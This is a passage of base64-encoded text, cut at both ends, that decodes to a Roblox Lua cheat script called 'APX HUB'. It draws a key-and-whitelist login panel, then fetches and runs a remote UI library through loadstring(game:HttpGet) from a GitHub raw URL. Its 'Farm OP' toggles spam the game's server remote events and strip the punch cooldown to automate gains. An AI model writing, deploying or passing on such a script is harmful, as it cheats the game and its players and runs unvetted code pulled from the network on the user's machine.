wgMCwgMCwgMzApCmtleUJveC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuNDUsIDApCmtleUJveC5QbGFjZWhvbGRlclRleHQgPSAiRW50ZXIga2V5Li4uIgprZXlCb3guVGV4dCA9ICIiCmtleUJveC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMzUsIDM1LCA0MCkKa2V5Qm94LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQprZXlCb3guRm9udCA9IEVudW0uRm9udC5Hb3RoYW0Ka2V5Qm94LlRleHRTaXplID0gMTIKa2V5Qm94LlBhcmVudCA9IGtleUZyYW1lCgpsb2NhbCBVSUNvcm5lcjIgPSBJbnN0YW5jZS5uZXcoIlVJQ29ybmVyIikKVUlDb3JuZXIyLkNvcm5lclJhZGl1cyA9IFVEaW0ubmV3KDAsIDUpClVJQ29ybmVyMi5QYXJlbnQgPSBrZXlCb3gKCmxvY2FsIHN1Ym1pdEJ0biA9IEluc3RhbmNlLm5ldygiVGV4dEJ1dHRvbiIpCnN1Ym1pdEJ0bi5TaXplID0gVURpbTIubmV3KDAuOCwgMCwgMCwgMzApCnN1Ym1pdEJ0bi5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuNjUsIDApCnN1Ym1pdEJ0bi5UZXh0ID0gIlZFUklGWSBLRVkiCnN1Ym1pdEJ0bi5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjIxLCAyNCwgMjQpCnN1Ym1pdEJ0bi5UZXh0Q29sb3IzID0gQ29sb3IzLmZyb21SR0IoMjU1LCAyNTUsIDI1NSkKc3VibWl0QnRuLkZvbnQgPSBFbnVtLkZvbnQuR290aGFtQm9sZApzdWJtaXRCdG4uVGV4dFNpemUgPSAxMgpzdWJtaXRCdG4uUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIFVJQ29ybmVyMyA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpVSUNvcm5lcjMuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgNikKVUlDb3JuZXIzLlBhcmVudCA9IHN1Ym1pdEJ0bgoKbG9jYWwgc3RhdHVzID0gSW5zdGFuY2UubmV3KCJUZXh0TGFiZWwiKQpzdGF0dXMuU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDE1KQpzdGF0dXMuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xLCAwLCAwLjg1LCAwKQpzdGF0dXMuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKc3RhdHVzLlRleHQgPSAiIgpzdGF0dXMuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMjU1LCAyNTUpCnN0YXR1cy5Gb250ID0gRW51bS5Gb250LkdvdGhhbQpzdGF0dXMuVGV4dFNpemUgPSAxMApzdGF0dXMuUGFyZW50ID0ga2V5RnJhbWUKCi0tIExvYWRpbmcgQmFyIEVsZW1lbnRzIChpbml0aWFsbHkgaGlkZGVuKQpsb2NhbCBsb2FkaW5nQmFyQmFja2dyb3VuZCA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpsb2FkaW5nQmFyQmFja2dyb3VuZC5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApIC0tIFN0YXJ0IGFzIHRpbnkgYm94CmxvYWRpbmdCYXJCYWNrZ3JvdW5kLlBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41NSwgMCkgLS0gQ2VudGVyIHBvc2l0aW9uCmxvYWRpbmdCYXJCYWNrZ3JvdW5kLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig0MCwgNDAsIDQ1KQpsb2FkaW5nQmFyQmFja2dyb3VuZC5WaXNpYmxlID0gZmFsc2UKbG9hZGluZ0JhckJhY2tncm91bmQuUGFyZW50ID0ga2V5RnJhbWUKCmxvY2FsIGxvYWRpbmdCYXJVSUNvcm5lciA9IEluc3RhbmNlLm5ldygiVUlDb3JuZXIiKQpsb2FkaW5nQmFyVUlDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTApCmxvYWRpbmdCYXJVSUNvcm5lci5QYXJlbnQgPSBsb2FkaW5nQmFyQmFja2dyb3VuZAoKbG9jYWwgbG9hZGluZ0JhciA9IEluc3RhbmNlLm5ldygiRnJhbWUiKQpsb2FkaW5nQmFyLlNpemUgPSBVRGltMi5uZXcoMCwgMCwgMSwgMCkKbG9hZGluZ0Jhci5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKQpsb2FkaW5nQmFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDIwMCwgMjU1KQpsb2FkaW5nQmFyLlBhcmVudCA9IGxvYWRpbmdCYXJCYWNrZ3JvdW5kCgpsb2NhbCBsb2FkaW5nQmFyQ29ybmVyID0gSW5zdGFuY2UubmV3KCJVSUNvcm5lciIpCmxvYWRpbmdCYXJDb3JuZXIuQ29ybmVyUmFkaXVzID0gVURpbS5uZXcoMCwgMTApCmxvYWRpbmdCYXJDb3JuZXIuUGFyZW50ID0gbG9hZGluZ0JhcgoKbG9jYWwgbG9hZGluZ1RleHQgPSBJbnN0YW5jZS5uZXcoIlRleHRMYWJlbCIpCmxvYWRpbmdUZXh0LlNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAwLCAxNSkKbG9hZGluZ1RleHQuUG9zaXRpb24gPSBVRGltMi5uZXcoMC4xLCAwLCAwLjcsIDApCmxvYWRpbmdUZXh0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCmxvYWRpbmdUZXh0LlRleHQgPSAiVmVyaWZ5aW5nIFBsYXllci4uLiIKbG9hZGluZ1RleHQuVGV4dENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDIwMCwgMjAwLCAyNTUpCmxvYWRpbmdUZXh0LkZvbnQgPSBFbnVtLkZvbnQuR290aGFtCmxvYWRpbmdUZXh0LlRleHRTaXplID0gMTEKbG9hZGluZ1RleHQuVmlzaWJsZSA9IGZhbHNlCmxvYWRpbmdUZXh0LlBhcmVudCA9IGtleUZyYW1lCgpsb2NhbCBwZXJjZW50YWdlVGV4dCA9IEluc3RhbmNlLm5ldygiVGV4dExhYmVsIikKcGVyY2VudGFnZVRleHQuU2l6ZSA9IFVEaW0yLm5ldygwLjgsIDAsIDAsIDE1KQpwZXJjZW50YWdlVGV4dC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjEsIDAsIDAuNTUsIDApCnBlcmNlbnRhZ2VUZXh0LkJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxCnBlcmNlbnRhZ2VUZXh0LlRleHQgPSAiMCUiCnBlcmNlbnRhZ2VUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDI1NSwgMjU1KQpwZXJjZW50YWdlVGV4dC5Gb250ID0gRW51bS5Gb250LkdvdGhhbUJvbGQKcGVyY2VudGFnZVRleHQuVGV4dFNpemUgPSAxMgpwZXJjZW50YWdlVGV4dC5WaXNpYmxlID0gZmFsc2UKcGVyY2VudGFnZVRleHQuUGFyZW50ID0ga2V5RnJhbWUKCi0tIEhvdmVyIGVmZmVjdHMKc3VibWl0QnRuLk1vdXNlRW50ZXI6Q29ubmVjdChmdW5jdGlvbigpCiAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZShzdWJtaXRCdG4sIFR3ZWVuSW5mby5uZXcoMC4yKSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDUwLCA1MCl9KTpQbGF5KCkKZW5kKQoKc3VibWl0QnRuLk1vdXNlTGVhdmU6Q29ubmVjdChmdW5jdGlvbigpCiAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZShzdWJtaXRCdG4sIFR3ZWVuSW5mby5uZXcoMC4yKSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyMjEsIDI0LCAyNCl9KTpQbGF5KCkKZW5kKQoKLS0gU2hha2UgZnVuY3Rpb24gZm9yIHdyb25nIGtleQpsb2NhbCBmdW5jdGlvbiBzaGFrZUZyYW1lKCkKICAgIGxvY2FsIG9yaWdpbmFsUG9zaXRpb24gPSBrZXlGcmFtZS5Qb3NpdGlvbgogICAgbG9jYWwgc2hha2VJbnRlbnNpdHkgPSA1CiAgICAKICAgIGZvciBpID0gMSwgNiBkbwogICAgICAgIGxvY2FsIG9mZnNldFggPSBtYXRoLnJhbmRvbSgtc2hha2VJbnRlbnNpdHksIHNoYWtlSW50ZW5zaXR5KQogICAgICAgIGxvY2FsIG9mZnNldFkgPSBtYXRoLnJhbmRvbSgtc2hha2VJbnRlbnNpdHksIHNoYWtlSW50ZW5zaXR5KQogICAgICAgIAogICAgICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKAogICAgICAgICAgICBrZXlGcmFtZSwgCiAgICAgICAgICAgIFR3ZWVuSW5mby5uZXcoMC4wNSwgRW51bS5FYXNpbmdTdHlsZS5MaW5lYXIsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksCiAgICAgICAgICAgIHtQb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIC0xNjAgKyBvZmZzZXRYLCAwLjUsIC0xMDAgKyBvZmZzZXRZKX0KICAgICAgICApOlBsYXkoKQogICAgICAgIAogICAgICAgIHdhaXQoMC4wNSkKICAgIGVuZAogICAgCiAgICAtLSBSZXR1cm4gdG8gb3JpZ2luYWwgcG9zaXRpb24KICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKAogICAgICAgIGtleUZyYW1lLCAKICAgICAgICBUd2VlbkluZm8ubmV3KDAuMSwgRW51bS5FYXNpbmdTdHlsZS5CYWNrLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLAogICAgICAgIHtQb3NpdGlvbiA9IG9yaWdpbmFsUG9zaXRpb259CiAgICApOlBsYXkoKQplbmQKCi0tIFNVQ0NFU1M6IE1ha2UgYm9yZGVyIGdyZWVuIHRlbXBvcmFyaWx5CmxvY2FsIGZ1bmN0aW9uIGZsYXNoU3VjY2Vzc0JvcmRlcigpCiAgICBsb2NhbCBvcmlnaW5hbENvbG9ycyA9IHsKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDAsIENvbG9yMy5mcm9tUkdCKDUxLCA1MSwgNTEpKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDIyMSwgMjQsIDI0KSkKICAgIH0KICAgIAogICAgLS0gRmxhc2ggZ3JlZW4KICAgIGdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcoewogICAgICAgIENvbG9yU2VxdWVuY2VLZXlwb2ludC5uZXcoMCwgQ29sb3IzLmZyb21SR0IoNTAsIDIwMCwgNTApKSwKICAgICAgICBDb2xvclNlcXVlbmNlS2V5cG9pbnQubmV3KDEsIENvbG9yMy5mcm9tUkdCKDEwMCwgMjU1LCAxMDApKQogICAgfSkKICAgIAogICAgd2FpdCgwLjgpCiAgICAKICAgIC0tIFJldHVybiB0byBvcmlnaW5hbCBjb2xvcnMKICAgIGdyYWRpZW50LkNvbG9yID0gQ29sb3JTZXF1ZW5jZS5uZXcob3JpZ2luYWxDb2xvcnMpCmVuZAoKLS0gU2hyaW5rIGVsZW1lbnRzIGludG8gbG9hZGluZyBib3gKbG9jYWwgZnVuY3Rpb24gc2hyaW5rSW50b0xvYWRpbmdCb3goKQogICAgbG9jYWwgdHdlZW5TZXJ2aWNlID0gZ2FtZTpHZXRTZXJ2aWNlKCJUd2VlblNlcnZpY2UiKQogICAgCiAgICAtLSBNYWtlIGxvYWRpbmcgYm94IHZpc2libGUgYnV0IHRpbnkKICAgIGxvYWRpbmdCYXJCYWNrZ3JvdW5kLlZpc2libGUgPSB0cnVlCiAgICBsb2FkaW5nQmFyQmFja2dyb3VuZC5TaXplID0gVURpbTIubmV3KDAsIDAsIDAsIDApCiAgICBsb2FkaW5nQmFyQmFja2dyb3VuZC5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLjUsIDAsIDAuNTUsIDApCiAgICAKICAgIC0tIEtleUJveCBzaHJpbmtzIHRvIGNlbnRlciBhbmQgZmFkZXMKICAgIGxvY2FsIGtleUJveFNocmluayA9IHR3ZWVuU2VydmljZTpDcmVhdGUoCiAgICAgICAga2V5Qm94LAogICAgICAgIFR3ZWVuSW5mby5uZXcoMC41LCBFbnVtLkVhc2luZ1N0eWxlLkJhY2ssIEVudW0uRWFzaW5nRGlyZWN0aW9uLkluKSwKICAgICAgICB7CiAgICAgICAgICAgIFNpemUgPSBVRGltMi5uZXcoMCwgMCwgMCwgMCksCiAgICAgICAgICAgIFBvc2l0aW9uID0gVURpbTIubmV3KDAuNSwgMCwgMC41NSwgMCksCiAgICAgICAgICAgIEJhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxLAogICAgICAgICAgICBUZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgICAgIH0KICAgICkKICAgIAogICAgLS0gU3VibWl0QnRuIHNocmlua3MgdG8gY2VudGVyIGFuZCBmYWRlcwogICAgbG9jYWwgc3VibWl0QnRuU2hyaW5rID0gdHdlZW5TZXJ2aWNlOkNyZWF0ZSgKICAgICAgICBzdWJtaXRCdG4sCiAgICAgICAgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuQmFjaywgRW51bS5FYXNpbmdEaXJlY3Rpb24uSW4pLAogICAgICAgIHsKICAgICAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLCAwLCAwLCAwKSwKICAgICAgICAgICAgUG9zaXRpb24gPSBVRGltMi5uZXcoMC41LCAwLCAwLjU1LCAwKSwKICAgICAgICAgICAgQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEsCiAgICAgICAgICAgIFRleHRUcmFuc3BhcmVuY3kgPSAxCiAgICAgICAgfQogICAgKQogICAgCiAgICAtLSBQbGF5IHNocmluayBhbmltYXRpb25zCiAgICBrZXlCb3hTaHJpbms6UGxheSgpCiAgICBzdWJtaXRCdG5TaHJpbms6UGxheSgpCiAgICAKICAgIHdhaXQoMC42KQogICAgCiAgICAtLSBOb3cgZXhwYW5kIHRoZSBsb2FkaW5nIGJveCBpbnRvIGZ1bGwgbG9hZGluZyBiYXIKICAgIGxvY2FsIGV4cGFuZEJveCA9IHR3ZWVuU2VydmljZTpDcmVhdGUoCiAgICAgICAgbG9hZGluZ0JhckJhY2tncm91bmQsCiAgICAgICAgVHdlZW5JbmZvLm5ldygwLjYsIEVudW0uRWFzaW5nU3R5bGUuRWxhc3RpYywgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwKICAgICAgICB7CiAgICAgICAgICAgIFNpemUgPSBVRGltMi5uZXcoMC44LCAwLCAwLCAyMCksCiAgICAgICAgICAgIFBvc2l0aW9uID0gVURpbTIubmV3KDAuMSwgMCwgMC40NSwgMCkKICAgICAgICB9CiAgICApCiAgICAKICAgIGV4cGFuZEJveDpQbGF5KCkKICAgIAogICAgd2FpdCgwLjcpCmVuZAoKLS0gTG9hZGluZyBiYXIgYW5pbWF0aW9uCmxvY2FsIGZ1bmN0aW9uIGFuaW1hdGVMb2FkaW5nQmFyKCkKICAgIGxvYWRpbmdUZXh0LlZpc2libGUgPSB0cnVlCiAgICBwZXJjZW50YWdlVGV4dC5WaXNpYmxlID0gdHJ1ZQogICAgCiAgICAtLSBGYWRlIGluIHRleHQgZWxlbWVudHMKICAgIGxvYWRpbmdUZXh0LlRleHRUcmFuc3BhcmVuY3kgPSAxCiAgICBwZXJjZW50YWdlVGV4dC5UZXh0VHJhbnNwYXJlbmN5ID0gMQogICAgCiAgICBnYW1lOkdldFNlcnZpY2UoIlR3ZWVuU2VydmljZSIpOkNyZWF0ZSgKICAgICAgICBsb2FkaW5nVGV4dCwKICAgICAgICBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5RdWFkLCBFbnVtLkVhc2luZ0RpcmVjdGlvbi5PdXQpLAogICAgICAgIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0KICAgICk6UGxheSgpCiAgICAKICAgIGdhbWU6R2V0U2VydmljZSgiVHdlZW5TZXJ2aWNlIik6Q3JlYXRlKAogICAgICAgIHBlcmNlbnRhZ2VUZXh0LAogICAgICAgIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLlF1YWQsIEVudW0uRWFzaW5nRGlyZWN0aW9uLk91dCksCiAgICAgICAge1RleHRUcmFuc3BhcmVuY3kgPSAwfQogICAgKTpQbGF5KCkKICAgIAogICAgd2FpdCgwLjUpCiAgICAKICAgIC0tIFN0YXJ0IGxvYWRpbmcgcHJvZ3Jlc3MKICAgIGxvY2FsIHRvdGFsVGltZSA9IDIuNSAtLSAyLjUgc2Vjb25kcyB0b3RhbAogICAgbG9jYWwgc3RlcHMgPSAxMDAKICAgIGxvY2FsIHN0ZXBUaW1lID0gdG90YWxUaW1lIC8gc3RlcHMKICAgIAogICAgZm9yIGkgPSAwLCBzdGVwcyBkbwogICAgICAgIGxvY2FsIHByb2dyZXNzID0gaSAvIHN0ZXBzCiAgICAgICAgbG9hZGluZ0Jhci5TaXplID0gVURpbTIubmV3KHByb2dyZXNzLCAwLCAxLCAwKQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LlRleHQgPSBtYXRoLmZsb29yKHByb2dyZXNzICogMTAwKSAuLiAiJSIKICAgICAgICAKICAgICAgICAtLSBDaGFuZ2UgY29sb3IgYmFzZWQgb24gcHJvZ3Jlc3MKICAgICAgICBpZiBwcm9ncmVzcyA8IDAuMzMgdGhlbgogICAgICAgICAgICBsb2FkaW5nQmFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigyNTUsIDgwLCA4MCkgLS0gUmVkCiAgICAgICAgZWxzZWlmIHByb2dyZXNzIDwgMC42NiB0aGVuCiAgICAgICAgICAgIGxvYWRpbmdCYXIuQmFja2dyb3VuZENvbG9yMyA9IENvbG9yMy5mcm9tUkdCKDI1NSwgMTgwLCA2MCkgLS0gT3JhbmdlCiAgICAgICAgZWxzZQogICAgICAgICAgICBsb2FkaW5nQmFyLkJhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDI1NSwgMTAwKSAtLSBHcmVlbgogICAgICAgIGVuZAogICAgICAgIAogICAgICAgIHdhaXQoc3RlcFRpbWUpCiAgICBlbmQKZW5kCgotLSBDaGVjayBpZiB1c2VyIGlzIHdoaXRlbGlzdGVkCmxvY2FsIGZ1bmN0aW9uIGlzVXNlcldoaXRlbGlzdGVkKCkKICAgIGxvY2FsIHBsYXllck5hbWUgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuTmFtZTpsb3dlcigpCiAgICBmb3IgXywgd2hpdGVsaXN0ZWROYW1lIGluIGlwYWlycyh3aGl0ZWxpc3RlZFVzZXJzKSBkbwogICAgICAgIGlmIHBsYXllck5hbWUgPT0gd2hpdGVsaXN0ZWROYW1lOmxvd2VyKCkgdGhlbgogICAgICAgICAgICByZXR1cm4gdHJ1ZQogICAgICAgIGVuZAogICAgZW5kCiAgICByZXR1cm4gZmFsc2UKZW5kCgotLSBCdXR0b24gY2xpY2sgZnVuY3Rpb24KbG9jYWwgZnVuY3Rpb24gdmVyaWZ5S2V5KCkKICAgIGxvY2FsIGVudGVyZWRLZXkgPSBrZXlCb3guVGV4dDpnc3ViKCIlcysiLCAiIik6dXBwZXIoKQogICAgbG9jYWwgaXNXaGl0ZWxpc3RlZCA9IGlzVXNlcldoaXRlbGlzdGVkKCkKICAgIGxvY2FsIGtleVZhbGlkID0gZmFsc2UKICAgIAogICAgLS0gQ2hlY2sgaWYga2V5IGlzIHZhbGlkCiAgICBmb3IgXywgdmFsaWRLZXkgaW4gcGFpcnModmFsaWRLZXlzKSBkbwogICAgICAgIGlmIGVudGVyZWRLZXkgPT0gdmFsaWRLZXkgdGhlbgogICAgICAgICAgICBrZXlWYWxpZCA9IHRydWUKICAgICAgICAgICAgYnJlYWsKICAgICAgICBlbmQKICAgIGVuZAogICAgCiAgICBpZiBpc1doaXRlbGlzdGVkIGFuZCBrZXlWYWxpZCB0aGVuCiAgICAgICAgLS0gV2hpdGVsaXN0ZWQgdXNlciB3aXRoIGNvcnJlY3Qga2V5IC0gU0hSSU5LIFRPIExPQURJTkcgQk9YCiAgICAgICAgZmxhc2hTdWNjZXNzQm9yZGVyKCkgLS0gR1JFRU4gQk9SREVSIEZMQVNICiAgICAgICAgc2hyaW5rSW50b0xvYWRpbmdCb3goKQogICAgICAgIAogICAgICAgIC0tIFN0YXJ0IGxvYWRpbmcgYW5pbWF0aW9uCiAgICAgICAgYW5pbWF0ZUxvYWRpbmdCYXIoKQogICAgICAgIAogICAgICAgIC0tIFdhaXQgZm9yIGxvYWRpbmcgdG8gY29tcGxldGUKICAgICAgICB3YWl0KDAuNSkKICAgICAgICAKICAgICAgICAtLSBTaG93IGZpbmFsIHJlc3VsdAogICAgICAgIGxvYWRpbmdUZXh0LlRleHQgPSAi4pyFIFdoaXRlbGlzdGVkIC0gQWNjZXNzIEdyYW50ZWQhIgogICAgICAgIGxvYWRpbmdUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDI1NSwgMTAwKQogICAgICAgIHBlcmNlbnRhZ2VUZXh0LlRleHRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQigxMDAsIDI1NSwgMTAwKQogICAgICAgIAogICAgICAgIHdhaXQoMS41KQogICAgICAgIGtleUd1aTpEZXN0cm95KCkKICAgICAgICAKLS0gTG9hZCBVSSBMaWJyYXJ5CmxvY2FsIExpYnJhcnkgPSBsb2Fkc3RyaW5nKGdhbWU6SHR0cEdldCgiaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0R5bGFubm42OS9TSEVTSExMTExMTEwxMjNQUk9URUNURUQvcmVmcy9oZWFkcy9tYWluL0xpYnJhcnkubHVhIikpKCkKCi0tIENyZWF0ZSBNYWluIFdpbmRvdwpsb2NhbCBXaW5kb3cgPSBMaWJyYXJ5OldpbmRvdyh7CiAgICBUaXRsZSA9ICJBUFggSFVCIHx8IFBSSVZBVEUg4oCUIEhlbGxvICIgLi4gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkRpc3BsYXlOYW1lLAogICAgRGVzYyA9ICJCeSA6IER5bGFuIiwKICAgIEljb24gPSBob3VzZSwKICAgIFRoZW1lID0gIkRhcmsiLAogICAgQ29uZmlnID0gewogICAgICAgIEtleWJpbmQgPSBFbnVtLktleUNvZGUuTGVmdENvbnRyb2wsCiAgICAgICAgU2l6ZSA9IFVEaW0yLm5ldygwLCA1MDAsIDAsIDQwMCkKICAgIH0sCiAgICBDbG9zZVVJQnV0dG9uID0gewogICAgICAgIEVuYWJsZWQgPSB0cnVlLAogICAgICAgIFRleHQgPSAiT3Blbi9DbG9zZSIKICAgIH0KfSkKCi0tIFNpZGViYXIgVmVydGljYWwgU2VwYXJhdG9yCmxvY2FsIFNpZGViYXJMaW5lID0gSW5zdGFuY2UubmV3KCJGcmFtZSIpClNpZGViYXJMaW5lLlNpemUgPSBVRGltMi5uZXcoMCwgMSwgMSwgMCkKU2lkZWJhckxpbmUuUG9zaXRpb24gPSBVRGltMi5uZXcoMCwgMTQwLCAwLCAwKQpTaWRlYmFyTGluZS5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3IzLmZyb21SR0IoNjAsIDYwLCA2MCkKU2lkZWJhckxpbmUuQm9yZGVyU2l6ZVBpeGVsID0gMApTaWRlYmFyTGluZS5aSW5kZXggPSA1ClNpZGViYXJMaW5lLk5hbWUgPSAiU2lkZWJhckxpbmUiClNpZGViYXJMaW5lLlBhcmVudCA9IGdhbWU6R2V0U2VydmljZSgiQ29yZUd1aSIpCgoKbG9jYWwgUGxheWVycyA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpCmxvY2FsIHBsYXllciA9IFBsYXllcnMuTG9jYWxQbGF5ZXIKbG9jYWwgclN0byA9IGdhbWU6R2V0U2VydmljZSgiUmVwbGljYXRlZFN0b3JhZ2UiKSAKbG9jYWwgc25hY2tzID0geyJUT1VHSCBCYXIiLCAiUHJvdGVpbiBTaGFrZSIsICJQcm90ZWluIEJhciIsICJVTFRSQSBTaGFrZSIsICJFbmVyZ3kgU2hha2UiLCAiRW5lcmd5IEJhciIsICJUcm9waWNhbCBTaGFrZSJ9CmxvY2FsIHByb3RlaW5FZ2dOYW1lID0gIlByb3RlaW4gRWdnIgpsb2NhbCBkZWxheVRpbWUgPSAyOSAqIDYwICsgMzAgLS0gMjkgbWludXRlcyAzMCBzZWNvbmRzCiAgICAgICAgCi0tIEZhcm0gT1AgVGFiCmxvY2FsIEF1dG9GYXJtID0gV2luZG93OlRhYih7VGl0bGUgPSAiRmFybSBPUCIsIEljb24gPSAiZHVtYmJlbGwifSkKCi0tIEZhcm0gVG9vbHMgU2VjdGlvbgpBdXRvRmFybTpTZWN0aW9uKHtUaXRsZSA9ICJGQVJNIFRPT0xTIn0pCgpBdXRvRmFybTpUb2dnbGUoewogICAgVGl0bGUgPSAiQXV0b0Zhcm0gd2VpZ2h0cyIsCiAgICBEZXNjID0gIkVxdWlwIGFueSBmYXJtaW5nIHRvb2xzIiwKICAgIFZhbHVlID0gZmFsc2UsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKHN0YXRlKQogICAgICAgIHdoaWxlIHN0YXRlIGRvCiAgICAgICAgICAgIGxvY2FsIGFyZ3MgPSB7WzFdID0gInJlcCJ9CiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIodW5wYWNrKGFyZ3MpKSAgCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUnVuU2VydmljZSIpLlJlbmRlclN0ZXBwZWQ6V2FpdCgpICAKICAgICAgICBlbmQKICAgIGVuZAp9KQoKLS0gRmFzdCBQdW5jaApsb2NhbCBmdW5jdGlvbiBhdXRvRmFzdFB1bmNoKCkKICAgIGxvY2FsIHBsYXllciA9IGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyCiAgICB3aGlsZSBfRy5mYXN0UHVuY2ggZG8KICAgICAgICBsb2NhbCBwdW5jaFRvb2wgPSBwbGF5ZXIuQmFja3BhY2s6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgICAgICBpZiBwdW5jaFRvb2wgdGhlbgogICAgICAgICAgICBwdW5jaFRvb2wuUGFyZW50ID0gcGxheWVyLkNoYXJhY3RlcgogICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgIGVuZAoKICAgICAgICBsb2NhbCBjaGFyYWN0ZXIgPSBwbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgbG9jYWwgcHVuY2ggPSBjaGFyYWN0ZXIgYW5kIGNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKQogICAgICAgIGlmIHB1bmNoIGFuZCBwdW5jaDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICAgICAgcHVuY2guYXR0YWNrVGltZS5WYWx1ZSA9IDAKICAgICAgICBlbmQKCiAgICAgICAgcGxheWVyLm11c2NsZUV2ZW50OkZpcmVTZXJ2ZXIoInB1bmNoIiwgImxlZnRIYW5kIikKICAgICAgICBwbGF5ZXIubXVzY2xlRXZlbnQ6RmlyZVNlcnZlcigicHVuY2giLCAicmlnaHRIYW5kIikKICAgICAgICB0YXNrLndhaXQoMC4wMDEpCiAgICBlbmQKCiAgICBsb2NhbCBwdW5jaCA9IHBsYXllci5DaGFyYWN0ZXIgYW5kIHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIlB1bmNoIikKICAgIGlmIHB1bmNoIGFuZCBwdW5jaDpGaW5kRmlyc3RDaGlsZCgiYXR0YWNrVGltZSIpIHRoZW4KICAgICAgICBwdW5jaC5hdHRhY2tUaW1lLlZhbHVlID0gMC4zNQogICAgZW5kCgogICAgaWYgcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiUHVuY2giKSB0aGVuCiAgICAgICAgcGxheWVyLkNoYXJhY3Rlci5QdW5jaC5QYXJlbnQgPSBwbGF5ZXIuQmFja3BhY2sKICAgIGVuZAplbmQKCkF1dG9GYXJtOlRvZ2dsZSh7CiAgICBUaXRsZSA9ICJGYXN0IFB1bmNoIiwKICAgIERlc2MgPSAiUmFwaWQgcHVuY2ggYXV0b21hdGlvbiIsCiAgICBWYWx1ZSA9IGZhbHNlLAogICAgQ2FsbGJhY2sgPSBmdW5jdGlvbihzdGF0ZSkKICAgICAgICBfRy5mYXN0UHVuY2ggPSBzdGF0ZQogICAgICAgIGlmIHN0YXRlIHRoZW4KICAgICAgICAgICAgYXV0b0Zhc3RQdW5jaCgpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEF1dG8gUHVuY2